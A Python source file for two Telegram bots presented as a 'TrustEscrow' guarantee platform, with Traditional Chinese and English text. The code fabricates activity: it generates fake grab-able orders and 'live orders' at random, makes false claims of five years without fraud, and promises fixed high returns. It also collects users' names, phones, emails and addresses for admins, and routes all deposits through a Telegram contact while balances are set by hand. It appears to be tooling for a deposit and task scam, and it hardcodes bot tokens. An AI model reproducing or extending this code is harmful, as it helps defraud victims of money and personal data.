# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
import random
import time
import threading
import os
from flask import Flask
from datetime import datetime

# ======================== 机器人TOKEN ========================
BOT1_TOKEN = "8716451687:AAGXoF5wuwuroCJ23w5UzaueXCUyy5p67q0"
BOT2_TOKEN = "8279854167:AAHLrvg-i6e0M_WeG8coIljYlGg_RF8_oRM"

bot1 = telebot.TeleBot(BOT1_TOKEN)
bot2 = telebot.TeleBot(BOT2_TOKEN)

# ======================== Flask保活 ========================
app = Flask(__name__)

@app.route("/")
def index():
    return "OK", 200

def run_flask():
    try:
        port = int(os.environ.get("PORT", 8080))
        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    except:
        pass

# ==============================================================================
# ================================= 机器人A ====================================
# ==============================================================================

ADMIN_IDS_A = [8781082053, 8256055083]
VIRTUAL_ORDER_REFRESH_SECONDS_A = 120

user_lang1 = {}
user_balance1 = {}
user_verify1 = {}
user_info1 = {}
orders1 = {}
order_id1 = 101
last_msg1 = {}
user_applying1 = {}
user_flow1 = {}
user_banned1 = {}
virtual_orders1 = []

TEXT_A = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報

客服：@fcff88""",
        "reg_form": """📝 入駐擔保申請
請依序填寫真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID""",
        "reg_success": "✅ 入駐申請已提交，等待管理員審核",
        "reg_error": "❌ 格式錯誤，請按要求一次性發送完整5項信息",
        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 餘額：{:.2f} USDT
📌 狀態：{}

⏳ 未完成訂單：
{}
✅ 已完成訂單：
{}""",
        "grab": """🚀 搶單大廳（每2分鐘自動刷新）
點擊按鈕直接搶單：

{}""",
        "grab_success": "✅ 搶單成功，請接單",
        "grab_already_gone": "❌ 訂單已被搶走",
        "deposit": """💰 儲值 & 提現
請聯繫官方客服：
➡️ @fcff88""",
        "record": """📜 擔保記錄
{}""",
        "account_detail": """📋 資金明細
🆔 用戶ID：{}
💰 當前餘額：{:.2f} USDT

💸 資金流水：
{}

📦 所有訂單：
{}""",
        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",
        "status_canceled": "已取消",
        "accept_success": "✅ 接單成功，已扣除金額",
        "not_enough": "❌ 餘額不足",
        "not_verified": "❌ 未通過審核",
        "no_detail": "❌ 你尚未填寫入駐信息",
        "banned": "❌ 你已被封禁",
        "btn_back": "返回首頁",
        "btn_accept": "接單",
        "btn_grab": "搶單"
    },
    "en": {
        "home": """🏆 TrustEscrow Premium Platform
Safe, Stable, Secure

✅ 5 Years 0 Fraud
✅ 100% Safe Escrow
✅ 5% Grab Profit
✅ 15-20% Assign Profit

Support: @fcff88""",
        "reg_form": """📝 Escrow Registration
Fill in your real info:
1. Full Name
2. Phone Number
3. Email
4. Address
5. Referrer ID""",
        "reg_success": "✅ Application Submitted, Waiting for Review",
        "reg_error": "❌ Format Error, Please send all 5 items correctly",
        "profile": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USDT
📌 Status: {}

⏳ Pending Orders:
{}
✅ Completed Orders:
{}""",
        "grab": """🚀 Grab Hall (Auto-refresh every 2min)
Click button to grab order:

{}""",
        "grab_success": "✅ Order Grabbed, Please Accept",
        "grab_already_gone": "❌ Order Already Taken",
        "deposit": """💰 Deposit & Withdraw
Contact support: @fcff88""",
        "record": """📜 Escrow Record
{}""",
        "account_detail": """📋 Fund Detail
🆔 ID: {}
💰 Balance: {:.2f} USDT

💸 Flow:
{}

📦 All Orders:
{}""",
        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",
        "status_canceled": "Canceled",
        "accept_success": "✅ Order Accepted, Amount Deducted",
        "not_enough": "❌ Insufficient Balance",
        "not_verified": "❌ Not Verified",
        "no_detail": "❌ You have not submitted registration",
        "banned": "❌ You are banned",
        "btn_back": "Home",
        "btn_accept": "Accept",
        "btn_grab": "Grab"
    }
}

def refresh_virtual_orders1():
    global virtual_orders1
    while True:
        try:
            virtual_orders1 = []
            for i in range(6):
                vid = 101 + i
                amt = round(random.uniform(10, 100), 2)
                virtual_orders1.append({"id": vid, "amount": amt})
        except:
            pass
        time.sleep(VIRTUAL_ORDER_REFRESH_SECONDS_A)

def main_menu1(user_id):
    lang = user_lang1.get(user_id, "zh")
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保" if lang == "zh" else "Register", callback_data="reg"),
        InlineKeyboardButton("個人中心" if lang == "zh" else "Profile", callback_data="profile"),
        InlineKeyboardButton("賬號明細" if lang == "zh" else "Account Detail", callback_data="detail"),
        InlineKeyboardButton("搶單大廳" if lang == "zh" else "Grab", callback_data="grab"),
        InlineKeyboardButton("儲值提現" if lang == "zh" else "Deposit", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄" if lang == "zh" else "Record", callback_data="record"),
        InlineKeyboardButton("🌐 English" if lang == "zh" else "🌐 繁中", callback_data="lang"),
    )
    return m

def back_menu1(user_id):
    lang = user_lang1.get(user_id, "zh")
    t = TEXT_A[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
    return m

def accept_btn1(oid, user_id):
    lang = user_lang1.get(user_id, "zh")
    t = TEXT_A[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"acc_{oid}"))
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
    return m

def notify_admins1(text):
    for admin in ADMIN_IDS_A:
        try:
            bot1.send_message(admin, text)
        except:
            continue

@bot1.message_handler(commands=["start"])
def start_a(msg):
    try:
        u = msg.from_user.id
        user_lang1.setdefault(u, "zh")
        user_balance1.setdefault(u, 0.0)
        user_verify1.setdefault(u, 0)
        user_info1.setdefault(u, {})
        user_applying1[u] = False
        user_flow1.setdefault(u, [])
        user_banned1.setdefault(u, False)
        lang = user_lang1[u]
        if user_banned1[u]:
            bot1.send_message(u, TEXT_A[lang]["banned"])
            return
        sent = bot1.send_message(u, TEXT_A[lang]["home"], reply_markup=main_menu1(u))
        last_msg1[u] = sent.message_id
    except:
        pass

@bot1.callback_query_handler(func=lambda c: True)
def callback_a(c):
    try:
        u = c.from_user.id
        lang = user_lang1.get(u, "zh")
        t = TEXT_A[lang]
        mid = c.message.message_id
        cid = c.message.chat.id
        last_msg1[u] = mid

        if user_banned1.get(u, False):
            bot1.answer_callback_query(c.id, t["banned"], show_alert=True)
            return

        if c.data == "home":
            bot1.edit_message_text(t["home"], cid, mid, reply_markup=main_menu1(u))
        elif c.data == "lang":
            user_lang1[u] = "en" if lang == "zh" else "zh"
            t = TEXT_A[user_lang1[u]]
            bot1.edit_message_text(t["home"], cid, mid, reply_markup=main_menu1(u))
        elif c.data == "reg":
            if user_verify1.get(u, 0) != 0:
                bot1.answer_callback_query(c.id, TEXT_A["zh"]["reg_success"] if user_verify1[u] == 1 else "❌ 已通過", show_alert=True)
                return
            user_applying1[u] = True
            bot1.edit_message_text(t["reg_form"], cid, mid, reply_markup=back_menu1(u))
        elif c.data == "detail":
            bal = user_balance1.get(u, 0.0)
            flows = user_flow1.get(u, [])
            flow_text = "\n".join(flows[-10:]) if flows else ("無記錄" if lang == "zh" else "No Records")
            my_orders = [o for o in orders1.items() if o[1]["user"] == u]
            order_lines = []
            for oid, o in my_orders:
                typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
                sta_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                sta = sta_map.get(o["status"], t["status_wait"])
                profit = round(o["amount"] * (0.05 if o["type"] == "grab" else random.uniform(0.15, 0.2)), 2)
                order_lines.append(f"#{oid} {typ} {o['amount']} USDT +{profit} | {sta}")
            order_text = "\n".join(order_lines) if order_lines else ("無訂單" if lang == "zh" else "No Orders")
            text = t["account_detail"].format(u, bal, flow_text, order_text)
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders1.items():
                if o["user"] == u:
                    typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
                    s_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                    s = s_map.get(o["status"], t["status_wait"])
                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}"
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            v = user_verify1.get(u, 0)
            status = "未申請" if v == 0 else "審核中" if v == 1 else "已通過" if lang == "zh" else "Not Applied" if v == 0 else "Pending" if v == 1 else "Verified"
            p_text = "\n".join(pending) if pending else "無" if lang == "zh" else "None"
            c_text = "\n".join(completed) if completed else "無" if lang == "zh" else "None"
            text = t["profile"].format(u, user_balance1.get(u, 0), status, p_text, c_text)
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
        elif c.data == "grab":
            if user_verify1.get(u, 0) != 2:
                bot1.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            items = []
            m = InlineKeyboardMarkup(row_width=2)
            for vo in virtual_orders1:
                profit = round(vo["amount"] * 0.05, 2)
                items.append(f"#{vo['id']} {vo['amount']} USDT +{profit}")
                btn_text = f"搶{vo['id']}" if lang == "zh" else f"Grab {vo['id']}"
                m.add(InlineKeyboardButton(btn_text, callback_data=f"grab_item_{vo['id']}"))
            m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
            text = t["grab"].format("\n".join(items))
            bot1.edit_message_text(text, cid, mid, reply_markup=m)
        elif c.data.startswith("grab_item_"):
            if user_verify1.get(u, 0) != 2:
                bot1.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            vid = int(c.data.split("_")[-1])
            hit = next((x for x in virtual_orders1 if x["id"] == vid), None)
            if not hit:
                bot1.send_message(u, t["grab_already_gone"])
                return
            global order_id1
            oid = order_id1
            order_id1 += 1
            orders1[oid] = {"user": u, "amount": hit["amount"], "type": "grab", "status": 0}
            profit = round(hit["amount"] * 0.05, 2)
            if lang == "zh":
                s = f"✅ 搶單成功 #{oid}\n本金：{hit['amount']} USDT\n利潤：+{profit} USDT"
            else:
                s = f"✅ Order Grabbed #{oid}\nAmount: {hit['amount']} USDT\nProfit: +{profit} USDT"
            bot1.edit_message_text(s, cid, mid, reply_markup=accept_btn1(oid, u))
        elif c.data.startswith("acc_"):
            oid = int(c.data.split("_")[1])
            o = orders1.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot1.answer_callback_query(c.id, "❌ 無效訂單" if lang == "zh" else "❌ Invalid", show_alert=True)
                return
            if user_balance1.get(u, 0) < o["amount"]:
                bot1.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            user_balance1[u] -= o["amount"]
            user_flow1.setdefault(u, []).append(f"-{o['amount']:.2f} USDT 接單扣款")
            o["status"] = 1
            bot1.edit_message_text(t["accept_success"], cid, mid, reply_markup=back_menu1(u))
        elif c.data == "deposit":
            bot1.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu1(u))
        elif c.data == "record":
            lines = []
            for oid, o in orders1.items():
                if o["user"] == u:
                    s_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                    s = s_map.get(o["status"], t["status_wait"])
                    typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
                    lines.append(f"• #{oid} {typ} {o['amount']} USDT | {s}")
            text = t["record"].format("\n".join(lines) if lines else "無記錄" if lang == "zh" else "No Records")
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
        bot1.answer_callback_query(c.id)
    except Exception as e:
        pass

@bot1.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS_A)
def user_input_a(msg):
    try:
        u = msg.from_user.id
        if user_banned1.get(u, False):
            return
        txt = msg.text.strip()
        lang = user_lang1.get(u, "zh")
        t = TEXT_A[lang]
        if not user_applying1.get(u, False):
            return
        pattern = r"1\.?\s*真實姓名\s*(.+?)\s*2\.?\s*聯絡電話\s*(.+?)\s*3\.?\s*電子信箱\s*(.+?)\s*4\.?\s*居住地址\s*(.+?)\s*5\.?\s*推薦人ID\s*(.+)"
        match = re.search(pattern, txt, re.DOTALL)
        if match:
            name = match.group(1).strip()
            phone = match.group(2).strip()
            email = match.group(3).strip()
            addr = match.group(4).strip()
            ref = match.group(5).strip()
            user_info1[u] = {"name": name, "phone": phone, "email": email, "addr": addr, "ref": ref}
            user_verify1[u] = 1
            user_applying1[u] = False
            notify_admins1(f"📥 新入駐申請\n用戶ID：{u}\n姓名：{name}\n電話：{phone}\n郵箱：{email}\n地址：{addr}\n推薦人：{ref}")
            mid = last_msg1.get(u)
            if mid:
                bot1.edit_message_text(t["reg_success"], msg.chat.id, mid, reply_markup=main_menu1(u))
            else:
                bot1.send_message(msg.chat.id, t["reg_success"], reply_markup=main_menu1(u))
        else:
            mid = last_msg1.get(u)
            if mid:
                bot1.edit_message_text(t["reg_error"], msg.chat.id, mid, reply_markup=back_menu1(u))
            else:
                bot1.send_message(msg.chat.id, t["reg_error"], reply_markup=back_menu1(u))
    except:
        pass

@bot1.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS_A)
def admin_cmd_a(msg):
    try:
        u = msg.from_user.id
        txt = msg.text.strip()
        arr = txt.split()
        if len(arr) >= 2 and arr[0] in ["审核通过", "通过审核", "通过"]:
            target = int(arr[1])
            user_verify1[target] = 2
            bot1.send_message(u, f"✅ 已通過用戶 {target}")
            return
        if len(arr) >= 2 and arr[0] == "查ID":
            target = int(arr[1])
            bal = user_balance1.get(target, 0.0)
            os_list = [o for o in orders1.items() if o[1]["user"] == target]
            text = f"📋 用戶 {target}\n💰 餘額：{bal:.2f}\n"
            for oid, o in os_list:
                typ = "派單" if o["type"] == "assign" else "搶單"
                sta = {0: "待接單", 1: "已接單", 2: "已完成", 3: "已取消"}.get(o["status"], "?")
                profit = round(o["amount"] * (0.05 if o["type"] == "grab" else random.uniform(0.15, 0.2)), 2)
                text += f"#{oid} {typ} {o['amount']} +{profit} | {sta}\n"
            bot1.send_message(u, text)
            return
        if txt.startswith("+U "):
            _, uid, amt = txt.split()
            uid = int(uid)
            amt = float(amt)
            user_balance1[uid] = user_balance1.get(uid, 0.0) + amt
            user_flow1.setdefault(uid, []).append(f"+{amt:.2f} 管理員充值")
            bot1.send_message(u, f"✅ +{amt} → {uid}")
            return
        if txt.startswith("-U "):
            _, uid, amt = txt.split()
            uid = int(uid)
            amt = float(amt)
            user_balance1[uid] = max(0.0, user_balance1.get(uid, 0.0) - amt)
            user_flow1.setdefault(uid, []).append(f"-{amt:.2f} 管理員扣除")
            bot1.send_message(u, f"✅ -{amt} → {uid}")
            return
        if arr[0] == "派单" and len(arr) == 3:
            target = int(arr[1])
            amt = float(arr[2])
            global order_id1
            oid = order_id1
            order_id1 += 1
            orders1[oid] = {"user": target, "amount": amt, "type": "assign", "status": 0}
            profit = round(amt * random.uniform(0.15, 0.2), 2)
            bot1.send_message(u, f"✅ 派單 #{oid} → {target}")
            bot1.send_message(target, f"📢 新派單 #{oid}\n本金：{amt} USDT\n利潤：+{profit}", reply_markup=accept_btn1(oid, target))
            return
        if arr[0] == "完成" and len(arr) == 2:
            oid = int(arr[1])
            o = orders1.get(oid)
            if not o:
                bot1.send_message(u, "❌ 無此訂單")
                return
            o["status"] = 2
            profit = o["amount"] * (random.uniform(0.15, 0.2) if o["type"] == "assign" else 0.05)
            user_balance1[o["user"]] += o["amount"] + profit
            user_flow1.setdefault(o["user"], []).append(f"+{profit:.2f} 訂單#{oid} 收益")
            bot1.send_message(u, f"✅ 訂單 #{oid} 完成")
            return
        if arr[0] == "取消订单" and len(arr) == 2:
            oid = int(arr[1])
            o = orders1.get(oid)
            if not o:
                bot1.send_message(u, "❌ 無此訂單")
                return
            if o["status"] == 1:
                user_balance1[o["user"]] += o["amount"]
                user_flow1.setdefault(o["user"], []).append(f"+{o['amount']:.2f} 訂單#{oid} 退款")
            o["status"] = 3
            bot1.send_message(u, f"✅ 訂單 #{oid} 已取消")
            return
        if arr[0] == "封ID" and len(arr) == 2:
            target = int(arr[1])
            user_banned1[target] = True
            bot1.send_message(u, f"✅ 已封禁 {target}")
            return
        if arr[0] == "解ID" and len(arr) == 2:
            target = int(arr[1])
            user_banned1[target] = False
            bot1.send_message(u, f"✅ 已解封 {target}")
            return
    except:
        pass

# ==============================================================================
# ================================= 机器人B（已修复：语言 + +U -U）===============
# ==============================================================================

ADMIN_ID_B = 8401979801

user_lang2 = {}
user_step2 = {}
user_balance2 = {}
orders2 = {}

TEXT_B = {
    "zh": {
        "home": """🏠 TrustEscrow 專業擔保平台
我們已在擔保行業立足 5 年，專注解決線上交易欺詐問題。
【平台優勢】
✅ 5年零詐騙、數千用戶信賴
✅ 專業中間人墊資擔保
✅ 資金全程託管、絕對安全
✅ 口令配對、簡單快速
✅ 7×24線上客服支援
安全交易，從這裡開始。""",
        "about": """🏛️ 關於我們
TrustEscrow 已在擔保行業立足 5 年，是業內最專業、最具信譽的老牌擔保平台。""",
        "service": """📌 服務介紹
我們專注「中間人墊資擔保」模式，徹底解決線上交易不信任痛點。""",
        "safety": """🛡️ 安全保障
我們的機制讓你交易零擔心：買方資金 100% 平台託管、賣方確認收款才發貨。""",
        "help": """📞 幫助中心
任何問題請立即聯繫官方客服：➡️ @fcff88""",
        "deposit": """💰 儲值入口
僅透過官方客服處理儲值，保障資金安全。➡️ @fcff88""",
        "withdraw": """💳 提現入口
提現僅透過官方客服審核處理。➡️ @fcff88""",
        "history": """📜 擔保歷史
你的個人擔保記錄，所有訂單可查、不可刪除。""",
        "running": """🚨 平台實時擔保中訂單
━━━━━━━━━━━━━━━━━━━
{}
━━━━━━━━━━━━━━━━━━━
🔥 每秒都有訂單在成交
安全 · 熱門 · 專業 · 可靠""",
        "personal": "👤 個人中心\n用戶ID: {}\n錢包餘額: {:.2f} USDT",
        "create_escrow": "🚀 發起擔保",
        "join_escrow": "📥 輸入口令擔保",
        "input_amount": "💰 請輸入擔保金額（USDT）：",
        "input_tip": "🔒 請設置交易口令：",
        "input_sell_tip": "🔑 請輸入擔保口令：",
        "escrow_success": "✅ 擔保已發起！\n金額: {:.2f} USDT\n口令: {}\n請發送給賣方。",
        "pair_success": "✅ 訂單配對成功！\n買方: {}\n賣方: {}\n金額: {:.2f} USDT\n管理員已接收。",
        "no_money": "❌ 餘額不足",
        "tip_error": "❌ 口令錯誤",
        "back": "🏠 返回首頁",
        "lang": "🌐 English",
        "merchant": """🏪 商家·擔保入驻
想成為平台認證商家、開通專屬擔保權限？
請前往官方入驻機器人辦理：
✅ 商家認證 ✅ 擔保權限開通 ✅ 專屬額度與權益 ✅ 24小時快速審核""",
    },
    "en": {
        "home": """🏠 TrustEscrow Professional Escrow
We have 5+ years experience in secure escrow service.
【Features】
✅ 5 Years 0 Fraud
✅ Professional Guarantor Escrow
✅ 100% Safe Fund Custody
✅ Fast Code Pairing
✅ 24/7 Support
Trade with confidence.""",
        "about": """🏛️ About Us
TrustEscrow: 5+ years trusted by thousands of users.""",
        "service": """📌 Services
Professional guarantor escrow for safe online transactions.""",
        "safety": """🛡️ Security
100% fund custody, seller gets paid only after confirmation.""",
        "help": """📞 Help Center
Contact support: @fcff88""",
        "deposit": """💰 Deposit
Only via official support: @fcff88""",
        "withdraw": """💳 Withdraw
Processed only by admin: @fcff88""",
        "history": """📜 Escrow History""",
        "running": """🚨 LIVE ORDERS
━━━━━━━━━━━━━━━━━━━
{}
━━━━━━━━━━━━━━━━━━━
Safe · Hot · Professional · Reliable""",
        "personal": "👤 Profile\nID: {}\nBalance: {:.2f} USDT",
        "create_escrow": "🚀 Create Escrow",
        "join_escrow": "📥 Enter Code",
        "input_amount": "💰 Enter amount (USDT):",
        "input_tip": "🔒 Set your code:",
        "input_sell_tip": "🔑 Enter code:",
        "escrow_success": "✅ Escrow created!\nAmount: {:.2f} USDT\nCode: {}\nSend to seller.",
        "pair_success": "✅ Paired!\nBuyer: {}\nSeller: {}\nAmount: {:.2f} USDT\nAdmin notified.",
        "no_money": "❌ Insufficient balance",
        "tip_error": "❌ Invalid code",
        "back": "🏠 Home",
        "lang": "🌐 繁中",
        "merchant": """🏪 Merchant Registration
Go to official bot for merchant verification.""",
    }
}

def main_menu2(user_id):
    lang = user_lang2.get(user_id, "zh")
    t = TEXT_B[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton(t["create_escrow"], callback_data="create"),
        InlineKeyboardButton(t["join_escrow"], callback_data="join"),
        InlineKeyboardButton("🏪 商家入驻" if lang=="zh" else "🏪 Merchant", callback_data="merchant"),
        InlineKeyboardButton(t["personal"].split("\n")[0], callback_data="personal"),
        InlineKeyboardButton("🚨 實時擔保" if lang=="zh" else "🚨 LIVE", callback_data="running"),
        InlineKeyboardButton(t["deposit"].split("\n")[0], callback_data="deposit"),
        InlineKeyboardButton(t["withdraw"].split("\n")[0], callback_data="withdraw"),
        InlineKeyboardButton(t["history"], callback_data="history"),
        InlineKeyboardButton("📌 服務" if lang=="zh" else "📌 Service", callback_data="service"),
        InlineKeyboardButton("🛡️ 安全" if lang=="zh" else "🛡️ Security", callback_data="safety"),
        InlineKeyboardButton(t["about"].split("\n")[0], callback_data="about"),
        InlineKeyboardButton(t["help"].split("\n")[0], callback_data="help"),
        InlineKeyboardButton(t["lang"], callback_data="lang"),
    )
    return m

def back_menu2(user_id):
    lang = user_lang2.get(user_id, "zh")
    t = TEXT_B[lang]
    m = InlineKeyboardMarkup(row_width=1)
    m.add(InlineKeyboardButton(t["back"], callback_data="home"))
    return m

def merchant_menu2(user_id):
    lang = user_lang2.get(user_id, "zh")
    t = TEXT_B[lang]
    m = InlineKeyboardMarkup(row_width=1)
    m.add(
        InlineKeyboardButton("👉 前往入驻機器人" if lang == "zh" else "👉 Register Bot",
                             url="https://t.me/secureescrow_pro_bot"),
        InlineKeyboardButton(t["back"], callback_data="home")
    )
    return m

@bot2.message_handler(commands=['start'])
def start_b(msg):
    try:
        u = msg.from_user.id
        user_lang2.setdefault(u, "zh")
        user_step2[u] = None
        user_balance2.setdefault(u, 0.0)
        t = TEXT_B[user_lang2[u]]
        bot2.send_message(msg.chat.id, t["home"], reply_markup=main_menu2(u))
    except:
        pass

@bot2.callback_query_handler(func=lambda c: True)
def callback_b(c):
    try:
        u = c.from_user.id
        lang = user_lang2.get(u, "zh")
        t = TEXT_B[lang]
        mid = c.message.message_id
        cid = c.message.chat.id

        if c.data == "home":
            user_step2[u] = None
            bot2.edit_message_text(t["home"], cid, mid, reply_markup=main_menu2(u))
        elif c.data == "lang":
            user_lang2[u] = "en" if lang == "zh" else "zh"
            new_lang = user_lang2[u]
            new_t = TEXT_B[new_lang]
            bot2.edit_message_text(new_t["home"], cid, mid, reply_markup=main_menu2(u))
        elif c.data == "personal":
            txt = t["personal"].format(u, user_balance2[u])
            bot2.edit_message_text(txt, cid, mid, reply_markup=back_menu2(u))
        elif c.data == "running":
            items = []
            for i in range(4):
                code = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789", k=4))
                amt = random.choice([380, 500, 680, 880, 1000, 1200, 1500, 1800, 2000, 2500])
                st = random.choice(["擔保處理中", "賣方已收款", "待配對"] if lang == "zh" else ["Processing", "Paid", "Pairing"])
                items.append(f"⏳ 訂單 #{code}\n金額：{amt} USDT\n狀態：{st}")
            text = t["running"].format("\n\n".join(items))
            bot2.edit_message_text(text, cid, mid, reply_markup=back_menu2(u))
        elif c.data == "about":
            bot2.edit_message_text(t["about"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "service":
            bot2.edit_message_text(t["service"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "safety":
            bot2.edit_message_text(t["safety"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "help":
            bot2.edit_message_text(t["help"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "deposit":
            bot2.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "withdraw":
            bot2.edit_message_text(t["withdraw"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "history":
            bot2.edit_message_text(t["history"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "create":
            user_step2[u] = "create_amount"
            bot2.edit_message_text(t["input_amount"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "join":
            user_step2[u] = "join_tip"
            bot2.edit_message_text(t["input_sell_tip"], cid, mid, reply_markup=back_menu2(u))
        elif c.data == "merchant":
            bot2.edit_message_text(t["merchant"], cid, mid, reply_markup=merchant_menu2(u))
        bot2.answer_callback_query(c.id)
    except:
        pass

@bot2.message_handler(func=lambda m: True)
def msg_b(msg):
    try:
        u = msg.from_user.id
        cid = msg.chat.id
        txt = msg.text.strip()
        lang = user_lang2.get(u, "zh")
        t = TEXT_B[lang]

        # ============== 管理员指令：+U ID 金额 ==============
        if u == ADMIN_ID_B and txt.startswith("+U "):
            arr = txt.split()
            if len(arr) == 3:
                uid = int(arr[1])
                amt = float(arr[2])
                user_balance2[uid] = user_balance2.get(uid, 0.0) + amt
                bot2.send_message(cid, f"✅ +{amt} USDT → {uid}")
            return

        # ============== 管理员指令：-U ID 金额 ==============
        if u == ADMIN_ID_B and txt.startswith("-U "):
            arr = txt.split()
            if len(arr) == 3:
                uid = int(arr[1])
                amt = float(arr[2])
                user_balance2[uid] = max(0.0, user_balance2.get(uid, 0.0) - amt)
                bot2.send_message(cid, f"✅ -{amt} USDT → {uid}")
            return

        # 以下是你原来的逻辑，完全没动
        if user_step2.get(u) == "create_amount":
            amt = float(txt)
            user_step2[u] = {"step": "create_tip", "amount": amt}
            bot2.send_message(cid, t["input_tip"], reply_markup=back_menu2(u))
            return

        step = user_step2.get(u)
        if isinstance(step, dict) and step.get("step") == "create_tip":
            amt = step["amount"]
            code = txt
            if user_balance2.get(u, 0) < amt:
                bot2.send_message(cid, t["no_money"], reply_markup=main_menu2(u))
                user_step2[u] = None
                return
            user_balance2[u] -= amt
            orders2[code] = {"buyer": u, "amount": amt, "time": datetime.now().strftime("%m-%d %H:%M")}
            bot2.send_message(cid, t["escrow_success"].format(amt, code), reply_markup=main_menu2(u))
            user_step2[u] = None
            return

        if user_step2.get(u) == "join_tip":
            code = txt
            if code not in orders2:
                bot2.send_message(cid, t["tip_error"], reply_markup=main_menu2(u))
                return
            o = orders2[code]
            bot2.send_message(cid, t["pair_success"].format(o["buyer"], u, o["amount"]), reply_markup=main_menu2(u))
            try:
                bot2.send_message(ADMIN_ID_B, f"📥 新訂單\n口令：{code}\n買方：{o['buyer']}\n賣方：{u}\n金額：{o['amount']} USDT")
            except:
                pass
            del orders2[code]
            user_step2[u] = None
            return
    except:
        pass

# ==============================================================================
# ========================== 启动双机器人 ========================
# ==============================================================================

def run_bot1():
    try:
        bot1.infinity_polling(timeout=60, none_stop=True)
    except:
        pass

def run_bot2():
    try:
        bot2.infinity_polling(timeout=60, none_stop=True)
    except:
        pass

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=refresh_virtual_orders1, daemon=True).start()
    threading.Thread(target=run_bot1, daemon=True).start()
    threading.Thread(target=run_bot2, daemon=True).start()
    while True:
        time.sleep(1)
